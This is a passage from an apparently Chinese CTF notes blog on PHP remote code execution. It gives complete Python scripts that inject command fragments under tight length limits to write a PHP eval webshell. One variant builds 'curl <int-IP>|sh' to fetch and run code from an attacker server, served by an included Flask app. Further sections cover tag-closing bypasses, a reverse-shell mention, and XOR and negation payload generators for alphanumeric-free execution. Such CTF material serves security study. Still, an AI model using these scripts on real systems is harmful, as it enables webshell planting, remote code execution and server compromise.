class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><span class="hljs-string">&#x27;sh x&#x27;</span>,<br><span class="hljs-string">&#x27;sh j&#x27;</span><br>]<br><span class="hljs-comment">#&lt;?php eval($_GET[1]);?&gt;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir，可写"><a href="#环境无dir，可写" class="headerlink" title="环境无dir，可写"></a>环境无dir，可写</h5><p>思路是通过<code>ls</code>，<code>mv</code>，<code>cat</code>构造出<code>ls -t&gt;a</code>，再<code>curl</code>写一句话</p><p>具体操作如下：</p><p>先将<code>ls -t&gt;a</code>写入<code>z</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-1.png"></p><p>倒序写入<code>curl 335708495|sh</code>，注意服务器的ip要先转int</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-2.png"></p><p>服务器上用<code>flask</code>写个<code>shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>先执行<code>sh z</code>，即执行了<code>ls -t&gt;a</code>，即向<code>a</code>写入<code>curl 335708495|sh</code>，再<code>sh a</code>，就执行了<code>curl 335708495|sh</code>，并返回<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code>，成功写入<code>1.php</code></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:58</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-comment">#curl 335708495|sh</span><br><span class="hljs-string">&#x27;&gt;sh&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;5\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;49\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;08\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;57\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;33\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rl\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cu\\&#x27;</span>,<br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span>,<br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir，可写但不出网"><a href="#环境无dir，可写但不出网" class="headerlink" title="环境无dir，可写但不出网"></a>环境无dir，可写但不出网</h5><p>因为<code>ls -t</code>命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用<code>echo xxx|base64 -d&gt;a.php</code>的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用<code>$&#123;IFS&#125;</code>代替空格，变成<code>echo$&#123;IFS&#125;xxxxxx|base64 -d&gt;a.php</code></p><p>步骤与<code>4字符-环境无dir，可写</code>基本一致，只是替换了<code>curl命令</code>，变成了<code>echo ...</code></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:56:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h3 id="长度限制总结"><a href="#长度限制总结" class="headerlink" title="长度限制总结"></a>长度限制总结</h3><p>1：当有长度限制的情况下，最少可以在<code>4</code>字符<code>无dir</code>环境下拼接出<code>ls -t</code><br>2：空格不够用时可以用<code>$&#123;IFS&#125;</code>代替，只要命令部分不出现重复的字符组合就行</p><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><p><code>eval()</code>，<code>assert()</code>，<code>preg_replace()</code>，<code>create_function()</code>，<code>array_map()</code>，<code>call_user_func()</code>，<code>call_user_func_array()</code>，<code>array_filter()</code>，<code>uasort()</code>，<code>array_walk_recursive</code>等</p><h2 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h2><p>某些题目表面上没有禁用函数，实际上在<code>php.ini</code>中使用了<code>disable_functions</code>来禁用函数</p><p>可以通过蚁剑的插件或手工绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/disable_functions.png"></p><p>小trick：<code>get形式的代码执行可以用转接头的形式在蚁剑上连接，例如/?1=assert($_POST[2]);</code></p><h2 id="标签闭合绕过"><a href="#标签闭合绕过" class="headerlink" title="标签闭合绕过"></a>标签闭合绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|\;/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>闭合了标签，那就造一个新的标签<code>&lt;script language=&quot;php&quot;&gt;system(&#39;tac /f*&#39;)&lt;/script&gt;</code></p><p>小trick：<code>&lt;/script&gt;结束标签自带一个;</code></p><h2 id="标签闭合-长度限制"><a href="#标签闭合-长度限制" class="headerlink" title="标签闭合+长度限制"></a>标签闭合+长度限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&lt;=<span class="hljs-number">13</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个小于13位的参数：<code>&lt;?`$_GET[2]`;</code></p><p>然后可以利用<code>&amp;2</code>传入反弹shell的命令等操作</p><h2 id="无字母数字代码执行"><a href="#无字母数字代码执行" class="headerlink" title="无字母数字代码执行"></a>无字母数字代码执行</h2><p>也是很经典的一类题目，参数中不能出现字母和数字<br>思路就是通过非字母数字的字符经过各种变换构造出任意字母，然后拼接出函数执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><h3 id="异或xor"><a href="#异或xor" class="headerlink" title="异或xor"></a>异或xor</h3><p>在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是相同为零，不同为一</p><p>例如<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)</code>，异或后得到<code>system</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/xor.png"></p><p>yu师傅的脚本，用来生成一个字典</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>然后用<code>($a)();</code>的形式执行代码即可，但是要注意<code>PHP7</code>前是不允许用<code>($a)();</code>这样的方法来执行动态函数的</p><p>补充：<code>PHP&gt;8</code>就不支持将没有引号包裹的字符解析为对应字符串了，<code>xx^yy</code>-&gt;<code>&#39;xx&#39;^&#39;yy&#39;</code>，这里<code>x  y</code>代表<code>ascii</code>大于<code>128</code>的值</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>例子</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">8C</span></span>-10001100<br>逐位取反<br><span class="hljs-tag">%<span class="hljs-selector-tag">73</span></span>-01110011<br></code></pre></td></tr></table></figure><p>利用php的取反符号<code>~</code>来构造任意字母</p><p>yu师傅脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span 